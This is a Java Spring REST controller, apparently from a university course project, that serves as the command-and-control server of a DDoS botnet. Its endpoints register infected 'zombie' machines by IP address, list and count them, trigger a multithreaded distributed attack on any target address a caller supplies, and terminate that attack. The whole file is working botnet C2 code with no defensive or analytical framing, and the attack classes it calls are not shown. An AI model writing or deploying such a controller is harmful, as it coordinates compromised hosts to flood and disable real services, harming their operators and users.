package edu.csupomona.cs480.controller;

import java.io.IOException;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.List;

import javax.servlet.http.HttpServletRequest;

import org.json.JSONException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import edu.csupomona.cs480.data.DistributeDDoSAttack;
import edu.csupomona.cs480.data.DistributeDDoSTermination;
import edu.csupomona.cs480.data.IP;
import edu.csupomona.cs480.data.IPServerJSONReader;
import edu.csupomona.cs480.data.provider.IPManager;


/**
 * This is the controller used by Spring framework.
 * <p>
 * The basic function of this controller is to map
 * each HTTP API Path to the correspondent method.
 *
 */

@RestController
public class WebController{


	@Autowired
	private IPManager ipManager;	

	// Store checked-in zombie IP address (and print timestamp)
	@RequestMapping(value = "/storeIP/", method = RequestMethod.POST)
	void sendIPTracking(@RequestParam("storeZombieIP") String trackIP, HttpServletRequest request)
	{
		IP ip = new IP();
		ip.setIP(request.getRemoteAddr());
		ipManager.updateIP(ip);

		Timestamp timestamp = new Timestamp(System.currentTimeMillis());
		System.out.println(request.getRemoteAddr() + " Zombie Checked-In at " 
				+ new SimpleDateFormat("MM/dd/yyyy HH:mm:ss").format(timestamp));
	}
	
	// Retrieve list of active zombies
	@RequestMapping(value = "/getZombieIPList", method = RequestMethod.GET)
	List<IP> listAllIPs() {
		
		List<IP> iPObjList = ipManager.listAllIPs();
		return iPObjList;
	}
	
	// Retrieve number of active zombies
	@RequestMapping(value = "/getZombieCount", method = RequestMethod.GET)
	int countAllIPs() {
		String filePath = System.getProperty("user.home") + "/ip" + "/" + "ip-map.json";
		IPServerJSONReader ipCount = new IPServerJSONReader();
		try {
			ipCount.getIPFromFile(filePath);
		} catch (IOException | JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return ipCount.getZombieCount();
	}
	
	// Trigger attack
	@RequestMapping(value = "/trigger/", method = RequestMethod.POST)
	void triggerAttack(@RequestParam("targetAddress") String targetAddr,
	           @RequestParam("numberOfThreads") String numThreads)
	{
		DistributeDDoSAttack distribA = new DistributeDDoSAttack(targetAddr, numThreads);
		System.out.println("Trigger Received from Attacker" );
		distribA.start();
	}
	
	// Terminate attack 
	@RequestMapping(value = "/terminate/", method = RequestMethod.POST)
	void terminateAttack(@RequestParam("confirm") String confirm)
	{
		DistributeDDoSTermination distribT = new DistributeDDoSTermination();
		System.out.println("Termination Received from Attacker" );
		distribT.start();
	}
}